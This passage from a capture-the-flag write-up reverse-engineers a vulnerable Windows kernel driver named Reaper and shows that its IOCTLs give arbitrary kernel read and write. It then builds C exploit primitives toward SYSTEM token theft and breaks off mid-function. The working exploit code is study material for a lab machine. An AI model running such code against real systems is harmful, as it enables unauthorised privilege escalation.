+<p>The <code class="language-plaintext highlighter-rouge">entry</code> function calls FUN_1400011c8, which is the function that sets up the driver:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">FUN_1400011c8</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">driverObject</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">status1</span><span class="p">;</span>
+  <span class="n">undefined1</span> <span class="n">stackCanary</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="n">undefined4</span> <span class="n">versionInfo</span><span class="p">;</span>
+  <span class="n">undefined1</span> <span class="n">padding</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="o">*</span><span class="n">deviceObject</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">deviceName</span> <span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">deviceNameBuffer</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_158</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">symbolicLinkName</span> <span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">symbolicLinkBuffer</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">versionInfoSize</span><span class="p">;</span>
+  <span class="n">longlong</span> <span class="n">osVersionBuffer</span> <span class="p">[</span><span class="mi">35</span><span class="p">];</span>
+  <span class="n">ulonglong</span> <span class="n">canary</span><span class="p">;</span>
+  
+  <span class="n">canary</span> <span class="o">=</span> <span class="n">DAT_140003000</span> <span class="o">^</span> <span class="p">(</span><span class="n">ulonglong</span><span class="p">)</span><span class="n">stackCanary</span><span class="p">;</span>
+  <span class="n">versionInfoSize</span> <span class="o">=</span> <span class="mh">0x114</span><span class="p">;</span>
+  <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">DispatchCreate</span><span class="p">;</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">osVersionBuffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,(</span><span class="n">undefined1</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x110</span><span class="p">);</span>
+  <span class="n">status</span> <span class="o">=</span> <span class="n">RtlGetVersion</span><span class="p">(</span><span class="o">&amp;</span><span class="n">versionInfoSize</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="n">status</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">deviceName</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1e001c</span><span class="p">;</span>
+    <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">DispatchClose</span><span class="p">;</span>
+    <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">DispatchClose</span><span class="p">;</span>
+    <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="mh">0xe</span><span class="p">]</span> <span class="o">=</span> <span class="n">DispatchDeviceControl</span><span class="p">;</span>
+    <span class="n">deviceNameBuffer</span> <span class="o">=</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">Reaper"</span><span class="p">;</span>
+    <span class="n">deviceObject</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">local_158</span><span class="p">;</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">versionInfo</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">status1</span> <span class="o">=</span> <span class="n">IoCreateDevice</span><span class="p">(</span><span class="n">driverObject</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">deviceName</span><span class="p">,</span><span class="mh">0x22</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="n">status1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">symbolicLinkName</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x160014</span><span class="p">;</span>
+      <span class="n">symbolicLinkBuffer</span> <span class="o">=</span> <span class="s">L"</span><span class="se">\\</span><span class="s">??</span><span class="se">\\</span><span class="s">Reaper"</span><span class="p">;</span>
+      <span class="n">status1</span> <span class="o">=</span> <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="n">symbolicLinkName</span><span class="p">,</span><span class="n">deviceName</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">status1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">IoDeleteDevice</span><span class="p">(</span><span class="n">local_158</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">CheckCanary</span><span class="p">(</span><span class="n">canary</span> <span class="o">^</span> <span class="p">(</span><span class="n">ulonglong</span><span class="p">)</span><span class="n">stackCanary</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The important section is where the <code class="language-plaintext highlighter-rouge">MajorFunction</code> functions are assigned:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">DispatchClose</span><span class="p">;</span>
+    <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">DispatchClose</span><span class="p">;</span>
+    <span class="n">driverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="mh">0xe</span><span class="p">]</span> <span class="o">=</span> <span class="n">DispatchDeviceControl</span><span class="p">;</span>
+</code></pre></div></div>
+<p>0 is <code class="language-plaintext highlighter-rouge">IRP_MJ_CREATE</code>, 2 is <code class="language-plaintext highlighter-rouge">IRP_MJ_CLOSE</code>, and 0xe is <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code>, the last being the most interesting.</p>
+<h4 id="dispatchdevicecontrol">DispatchDeviceControl</h4>
+<p>The <code class="language-plaintext highlighter-rouge">DispatchDeviceControl</code> function (0x140001020) handles the <a href="https://en.wikipedia.org/wiki/Ioctl">ioctl calls</a>. It gets the parameters and IOCTL number, and switches based on the IOCTL. There are three IOCTL codes defined:</p>
+<picture>
+<source srcset="/img/image-20250825092847552.webp" type="image/webp"/>
+<img alt="image-20250825092847552" class="include_image" loading="lazy" src="/img/image-20250825092847552.png"/>
+</picture>
+<ul>
+<li>0x80002003 allocates a buffer of 0x20 bytes and writes user data into it provided that the first word is a magic value of 0x6a55cc9e.</li>
+<li>0x8000200b copies eight bytes of data from a source address to a destination address, both of which are provided in the allocation call. If they are not set, it does nothing.</li>
+<li>0x80002007 frees the data structure allocated in the first call.</li>
+</ul>
+<p>Effectively I have arbitrary write in the kernel using this driver.</p>
+<h3 id="token-theft">Token Theft</h3>
+<h4 id="strategy-1">Strategy</h4>
+<p>The most straight-forward path here is to steal the token from a system process and copy it into the current process, and then execute a shell. To do this, I only need to find a way to get the memory address of the token in the current thread, and the memory address of the token in a system thread.</p>
+<h4 id="interacting-with-driver">Interacting with Driver</h4>
+<p>I actually pops the Ghidra <code class="language-plaintext highlighter-rouge">DispatchDeviceControl</code> decompile into ChatGPT and asked it to make me some C code to interact with it:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define IOCTL_SET_DATA     0x80002003
+#define IOCTL_FREE_DATA    0x80002007
+#define IOCTL_APPLY_THREAD 0x8000200b
+</span>
+<span class="c1">// Matches what the driver expects</span>
+<span class="cp">#pragma pack(push, 1)
+</span><span class="k">struct</span> <span class="n">ThreadDataInput</span> <span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>     <span class="c1">// must be 0x6a55cc9e</span>
+    <span class="kt">uint32_t</span> <span class="n">threadId</span><span class="p">;</span>  <span class="c1">// target TID</span>
+    <span class="kt">uint32_t</span> <span class="n">priority</span><span class="p">;</span>  <span class="c1">// new priority</span>
+    <span class="kt">uint32_t</span> <span class="n">padding</span><span class="p">;</span>   <span class="c1">// alignment</span>
+    <span class="kt">uint64_t</span> <span class="n">ptrA</span><span class="p">;</span>      <span class="c1">// optional</span>
+    <span class="kt">uint64_t</span> <span class="n">ptrB</span><span class="p">;</span>      <span class="c1">// optional</span>
+<span class="p">};</span>
+<span class="cp">#pragma pack(pop)
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  %s &lt;DeviceName&gt; &lt;IOCTL&gt; [args]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Examples:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  %s </span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">MyDriver set &lt;tid&gt; &lt;priority&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  %s </span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">MyDriver apply</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  %s </span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">MyDriver free</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">deviceName</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span>
+        <span class="n">deviceName</span><span class="p">,</span>
+        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+        <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+        <span class="nb">NULL</span>
+    <span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to open %s: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">deviceName</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">DWORD</span> <span class="n">ioctlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">inBuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">inSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">BOOL</span> <span class="n">ok</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"set"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Usage: %s %s set &lt;tid&gt; &lt;priority&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">deviceName</span><span class="p">);</span>
+            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">DWORD</span> <span class="n">tid</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">DWORD</span> <span class="n">prio</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+        <span class="k">static</span> <span class="k">struct</span> <span class="n">ThreadDataInput</span> <span class="n">input</span><span class="p">;</span>
+        <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">));</span>
+        <span class="n">input</span><span class="p">.</span><span class="n">magic</span>    <span class="o">=</span> <span class="mh">0x6a55cc9e</span><span class="p">;</span>
+        <span class="n">input</span><span class="p">.</span><span class="n">threadId</span> <span class="o">=</span> <span class="n">tid</span><span class="p">;</span>
+        <span class="n">input</span><span class="p">.</span><span class="n">priority</span> <span class="o">=</span> <span class="n">prio</span><span class="p">;</span>
+        <span class="n">input</span><span class="p">.</span><span class="n">ptrA</span>     <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">input</span><span class="p">.</span><span class="n">ptrB</span>     <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+        <span class="n">ioctlCode</span> <span class="o">=</span> <span class="n">IOCTL_SET_DATA</span><span class="p">;</span>
+        <span class="n">inBuf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">;</span>
+        <span class="n">inSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"apply"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ioctlCode</span> <span class="o">=</span> <span class="n">IOCTL_APPLY_THREAD</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"free"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ioctlCode</span> <span class="o">=</span> <span class="n">IOCTL_FREE_DATA</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Unknown command: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">ok</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span>
+        <span class="n">hDevice</span><span class="p">,</span>
+        <span class="n">ioctlCode</span><span class="p">,</span>
+        <span class="n">inBuf</span><span class="p">,</span> <span class="n">inSize</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span>
+        <span class="nb">NULL</span>
+    <span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] DeviceIoControl failed: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] IOCTL 0x%08lx sent successfully</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ioctlCode</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This is not 100% correct, but it’s close enough. It opens the device using <code class="language-plaintext highlighter-rouge">CreateFileA</code>, then uses that handle to interact with the driver using</p>
+<p>It also adds:</p>
+<picture>
+<source srcset="/img/image-20250825105955956.webp" type="image/webp"/>
+<img alt="image-20250825105955956" class="include_image" loading="lazy" src="/img/image-20250825105955956.png"/>
+</picture>
+<p>I’ll compile this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>x86_64-w64-mingw32-gcc driver_poc.c <span class="nt">-o</span> driver_poc
+</code></pre></div></div>
+<p>And upload it to Reaper using RDP copy / paste. It runs:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\keysvc\Desktop&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\driver_poc.exe</span><span class="w"> </span><span class="nx">\\.\Reaper</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">1234</span><span class="w"> </span><span class="nx">15</span><span class="w">
+</span><span class="go">[+] IOCTL 0x80002003 sent successfully
+</span><span class="gp">PS C:\Users\keysvc\Desktop&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\driver_poc.exe</span><span class="w"> </span><span class="nx">\\.\Reaper</span><span class="w"> </span><span class="nx">apply</span><span class="w">
+</span><span class="go">[+] IOCTL 0x8000200b sent successfully
+</span><span class="gp">PS C:\Users\keysvc\Desktop&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\driver_poc.exe</span><span class="w"> </span><span class="nx">\\.\Reaper</span><span class="w"> </span><span class="nx">free</span><span class="w">
+</span><span class="go">[+] IOCTL 0x80002007 sent successfully
+</span></code></pre></div></div>
+<h3 id="primitives">Primitives</h3>
+<h4 id="device-handle">Device Handle</h4>
+<p>I’ll start a C program to exploit this driver. To interact with the driver, I’ll need a handle to the device. I’ll make a global variable <code class="language-plaintext highlighter-rouge">hReaper</code> that I initialize to <code class="language-plaintext highlighter-rouge">NULL</code> at the top of the program. Then the <code class="language-plaintext highlighter-rouge">ReaperHandle</code> function checks if the global is <code class="language-plaintext highlighter-rouge">NULL</code>. If it is, it opens the handle and sets the global. Otherwise, it returns the value in the global.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">ReaperHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hReaper</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">LPCSTR</span> <span class="n">filename</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">Reaper"</span><span class="p">;</span>
+
+        <span class="n">hReaper</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span>
+            <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+            <span class="mi">0</span><span class="p">,</span>
+            <span class="nb">NULL</span><span class="p">,</span>
+            <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+            <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+            <span class="nb">NULL</span>
+        <span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">hReaper</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle to device, %s: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Got handle to device, %s</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="n">hReaper</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h4 id="ioctl-calls">ioctl Calls</h4>
+<p>The first thing I need is functions to make the three ioctl calls. The data structure passed into these calls is needed as well, which I’ll call <code class="language-plaintext highlighter-rouge">ReaperData</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">ReaperData</span> <span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">magic</span><span class="p">;</span>     <span class="c1">// must be 0x6a55cc9e</span>
+    <span class="n">DWORD</span> <span class="n">thread_id</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">priority</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">padding</span><span class="p">;</span>
+    <span class="n">ULONGLONG</span> <span class="n">src_addr</span><span class="p">;</span>
+    <span class="n">ULONGLONG</span> <span class="n">dst_addr</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">ReaperData</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Just as in the code ChatGPT generated for me above, calling each ioctl is very similar. Therefore, I’ll make a <code class="language-plaintext highlighter-rouge">MakeIoCTL</code> function that handles the main parts of it, and then three functions that just call it:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">MakeIoCTL</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">ioctl</span><span class="p">,</span> <span class="n">ReaperData</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">dataSize</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">outputBuffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">ULONG</span> <span class="n">outputLength</span><span class="p">;</span>
+    
+    <span class="n">DeviceIoControl</span><span class="p">(</span>
+        <span class="n">ReaperHandle</span><span class="p">(),</span>
+        <span class="n">ioctl</span><span class="p">,</span>
+        <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">data</span><span class="p">,</span>
+        <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ReaperData</span><span class="p">),</span>
+        <span class="n">outputBuffer</span><span class="p">,</span>
+        <span class="k">sizeof</span><span class="p">(</span><span class="n">outputBuffer</span><span class="p">),</span>
+        <span class="o">&amp;</span><span class="n">outputLength</span><span class="p">,</span>
+        <span class="nb">NULL</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">Init</span><span class="p">(</span><span class="n">ReaperData</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">MakeIoCTL</span><span class="p">(</span><span class="n">IOCTL_INIT</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ReaperData</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">Copy</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">MakeIoCTL</span><span class="p">(</span><span class="n">IOCTL_COPY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">Free</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">MakeIoCTL</span><span class="p">(</span><span class="n">IOCTL_FREE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h4 id="arbitrary-read">Arbitrary Read</h4>
+<p>With these functions in place, arbitrary read just populates the <code class="language-plaintext highlighter-rouge">ReaperData</code> struct passing in the target as the <code class="language-plaintext highlighter-rouge">src</code> address and a local buffer as the output, and then returns the value in the output:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">arbRead</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">src</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">ReaperData</span> <span class="n">data</span><span class="p">;</span>
+	<span class="n">ULONGLONG</span> <span class="n">output</span><span class="p">;</span>
+
+    <span class="n">data</span><span class="p">.</span><span class="n">magic</span> <span class="o">=</span> <span class="mh">0x6A55CC9E</span><span class="p">;</span>
+    <span class="n">data</span><span class="p">.</span><span class="n">thread_id</span> <span class="o">=</span> <span class="n">GetCurrentThreadId</span><span class="p">();</span>
+    <span class="n">data</span><span class="p">.</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">data</span><span class="p">.</span><span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">data</span><span class="p">.</span><span class="n">src_addr</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
+    <span class="n">data</span><span class="p">.</span><span class="n">dst_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">&amp;</span><span class="n">output</span><span class="p">;</span>
+
+    <span class="n">Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">);</span>
+    <span class="n">Copy</span><span class="p">();</span>
+    <span class="n">Free</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="p">(</span><span class="n">output</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It’s not immediately obvious why I need an arbitrary read primitive. In theory, I just need to copy the token from a high privilege process into my current process. Finding the correct addresses for these will make use of the read primitive.</p>
+<h4 id="arbitrary-write">Arbitrary Write</h4>
+<p>Arbitrary write is just as simple, populating the struct with both the source and destination:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">arbWrite</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">dst</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">src</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">ReaperData</span> <span class="n">input</span><span class="p">;</span>
+
+    <span class="n">input</span><span class="p">.</span><span class="n">magic</span> <span class="o">=</span> <span class="mh">0x6A55CC9E</span><span class="p">;</span>
+    <span class="n">input</span><span class="p">.</span><span class="n">thread_id</span> <span class="o">=</span> <span class="n">GetCurrentThreadId</span><span class="p">();</span>
+    <span class="n">input</span><span class="p">.</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">input</span><span class="p">.</span><span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
